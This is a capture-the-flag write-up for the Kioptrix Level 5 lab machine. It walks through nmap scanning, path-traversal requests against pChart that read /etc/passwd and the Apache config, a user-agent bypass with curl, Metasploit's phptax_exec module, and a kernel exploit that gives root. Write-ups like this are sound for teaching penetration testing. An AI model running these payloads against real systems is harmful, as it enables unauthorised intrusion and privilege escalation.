<h1>Kioptrix: Level 5 Write-up</h1>

<h2>NMAP</h2>

```
PORT     STATE  SERVICE VERSION  
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)  
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
```

<h3>PORT 80</h3>


Found **/pChart2.1.3/index.php** in source code. 

After searching for the tool’s name on searchsploit, it showed that it’s vulnerable to LFI.

```
http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
```

**Checking For Config File's :**

```
http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf  
```

After reading carefully i found i have to access port 8080 with different **user-agent** :

```
curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080
curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080/phptax/
```

<h3>Exploiting phptax (METASPLOIT):</h3>

```
use exploit/multi/http/phptax_exec
set RHOST 192.168.1.68
set RPORT 8080
run
```

<h2>Privilege Escalation</h2>

Exploit : https://www.exploit-db.com/exploits/28718

```
gcc exploit.c  
  
./a.out  
[+] SYSRET FUCKUP!!  
[+] Start Engine...  
[+] Crotz...  
[+] Crotz...  
[+] Crotz...  
[+] Woohoo!!!  
whoami  
root  
```
